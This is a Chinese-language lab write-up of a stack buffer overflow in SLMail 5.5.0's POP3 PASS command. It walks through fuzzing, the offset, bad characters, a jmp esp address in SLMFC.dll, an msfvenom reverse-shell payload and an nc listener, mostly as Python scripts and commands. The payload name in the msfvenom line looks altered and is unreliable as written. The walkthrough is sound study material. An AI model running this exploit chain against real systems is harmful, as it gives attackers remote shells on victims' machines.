# SLMail 溢出案例

<p align="center">
    <img src="../../../../assets/img/banner/SLMail.jpg">
</p>

> 笔记内容由 [the-fog](https://github.com/the-fog) 提供,仅做部分内容排版修改

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**环境**

- win7
- SLMail 版本5.5.0
- ImmunityDebugger 版本1_85

**payload**

`pop3-pass-fuzz.py`

```python
#!/usr/bin/python
# -*- encoding: utf-8 -*-
import socket

#创建一个缓冲区数组,同时递增它们.

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s bytes"%len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('192.168.30.35',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
```

---

## 开始

以管理员权限运行 SLMail 和 Immunity Debugger

在 Immunity Debugger Attach --> SLMail

- 更改字体设置:右侧2个窗口任意一处右击-Appearance-font(all)-OEM fixed font
- 更改显示:下方左侧右击-Hex-Hex/ASCII(16bytes)

点击上方开始按钮后,在 kail 机运行 `python pop3-pass-fuzz.py` 脚本

大概跑到 2900 byte 时 debugger 显示 access violation when executing [41414141]-use Shift+F7/F8/F9 to pass exception to program 时,记录下此时的字节数,观察 EBP 和 EIP 的值,已被 A(41) 填充

![image](../../../../assets/img/Security/PWN/实验/SLMail溢出案例/1.png)

在 ESP 上右击 Follow in Dump,跳到内存查看

---

## 进一步测试

关闭 debugger,重启 slmail 服务

`slmail-pop3.py`
```python
#!/usr/bin/python
# -*- encoding: utf-8 -*-

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' * 2700

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.30.35',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

打开 Immunity Debugger Attach-SLMail,开始在 kail 机运行: python slmail-pop3.py 出现提示信息后,此时 EIP 也被 A 填充

使用 msf-pattern_create 模块,生成 2700 个字节的字符串: `msf-pattern_create -l 2700`

用生成的字符串去替换 slmail-pop3.py 脚本的 buffer 参数

重启 slmail 服务后运行脚本 `python slmail-pop3.py`

读出 EIP 的填充值,去生成的字符串中检索: `msf-pattern_offset -q 39694438`
```
Exact match at offset 2606
```

将 slmail-pop3.py 的 buffer 替换成: `buffer = "A" * 2606 + "B" * 4 + "C" * (2700-2606-4)`

重启 slmail 服务运行脚本 `python slmail-pop3.py`
可以观察到,EIP 的值已被 B(42) 填充

![image](../../../../assets/img/Security/PWN/实验/SLMail溢出案例/2.png)

通常 shellcode 包含 350-400 个字节

重启 slmail 服务,将 slmail-pop3.py 的 buffer 替换成: `buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)`

`python slmail-pop3.py` 观察到 EIP 仍被 B 填充,对 ESP 进行 Follow in Dump,发现其已被填充成 C(43) 算出此时栈中能利用的最大字节数: 0xA2D0 - 0xA128 = 0x1A8 = 424

发送从 0x00-0xff 字符来找出 bad char,通常情况下,0x00 都是 bad char

重启 slmail 服务,修改 payload 脚本如下

```python
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * 2606 + "B" * 4 + badchars
```
运行脚本 `python slmail-pop3.py` 在 debugger 中 follow esp in dump

找出其中一个 bad char 之后,修改 badchars 变量,继续测试: 重启 slmail 服务和 debugger, `python slmail-pop3.py` , follow esp in dump 重复上述步骤,直到找出所有的 bad chars

```
\x00
\x0a
\x0d
```

---

## 找 DLL

下载 mona,  https://github.com/corelan/mona 将 mona.py 拖放到"PyCommands"文件夹中(在 Immunity Debugger 应用程序文件夹中).

在 c:\python27 中安装 Python 2.7.14(或更高版本的 2.7.xx),从而覆盖与 Immunity 捆绑在一起的版本.尝试更新 mona 时需要这样做以避免 TLS 问题.确保正确安装 32 位版本的 python.

`!mona modules` 查看所有的模块

其中 Rebase 表示重启后是否会改变地址,False 即不改变;SafeSEH、ASLR、NXCompat 这三项都是 Windows 相关的安全机制;OS Dll 表示是否是 OS 自带的库;即前四列选 False,最后一列选 True

- 切换到上方的 m 模块,继续筛选出有执行权限的 dll(R  E)
- 再依次切换到满足上述条件的 dll 中查找是否存在所需指令:

![image](../../../../assets/img/Security/PWN/实验/SLMail溢出案例/3.png)

- 右击-Search for-command `jmp esp`
- 右击-Search for-Sequence of commands

    ```
    push esp
    retn
    ```
- 如果上述无法找到,找该命令对应的十六进制数,下面调用 msf 中的模块:

    ```
    msf-nasm_shell
    nasm > jmp esp
    00000000 FFE4                       jmp esp
    ```

- 对每个找到的 dll 执行:    !mona find -s "\xff\xe4" -m xxx.dll
- 确定对应的模块:  C:\windows\system32\SLMFC.dll
- 点上方的 e,会显示所有被 slmail.exe 加载的 dll 文件,找到 SLMFC.dll 后,双击,加载成功后,上方标题栏会变成[thread xxxxx,module SLMFC]

---

- 上方切换到 k 模块,在下方输入: `!mona find -s "\xff\xe4" -m slmfc.dll`
- 在找到的结果中,筛选没有 bad char 的项
- 点击上方最右边的向右箭头-输入内存地址(5F4A358F)-右击-copy to clipnoard

---

- 修改 py 脚本: `buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)`
- 重启 slmail 服务和 debugger,跳到 (5F4A358F) 内存处,F2 设置断点
- python slmail-pop3.py,可以观察到此时程序停在了(5F4A358F)处,右击 follow esp in dump,查看栈中的数据
- F7 单步调试,进入 jmp esp 中,观察到程序执行的代码段,全是 C

重启 slmail 服务和 debugger,使用 msfvenom 生成 shell code payload:

```bash
msfvenom -p windows/shell_Pwn_tcp LHOST=192.168.30.5 LPORT=4433 -f c -a x86 --platform windows -b "\x00\x0a\x0d"(找到的bad char) -e x86/shikata_ga_nai
```

会得到一串 shell code: unsigned char buf[] = "xxxx..."

修改 py 脚本

```python
shellcode = ("xxx...")

# \x90指的是nop,这里填写16个字节是为了容错,防止ESP寄存器起始的字节丢失而造成shellcode不能正常执行的情况.

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)
```

在 jmp esp 的内存地址处 F2 设置断点,python slmail-pop3.py,在断点处 F7 进行单步调试,把第八个 nop 处的值修改成 int3(函数中断),然后 F7 继续执行,到循环处,观察内存中的 shell code 解码,在 CLD 处 F2 添加断点,观察全部解码后的内存空间

在 kail 机进行侦听: `nc -lvp 4433` 可以看到有回弹 shell 连接过来
